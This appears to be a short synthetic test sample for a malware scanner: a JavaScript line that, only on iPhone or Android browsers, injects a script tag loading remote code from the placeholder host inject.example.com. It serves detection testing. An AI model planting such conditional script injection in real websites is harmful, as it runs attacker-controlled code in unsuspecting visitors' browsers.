/* fixed-malscan test sample - synthetic, harmless (example.com only) */
if (/iPhone|Android/i.test(navigator.userAgent)) { var s = document.createElement("script"); s.src = "https://inject.example.com/m.js"; document.head.appendChild(s); }
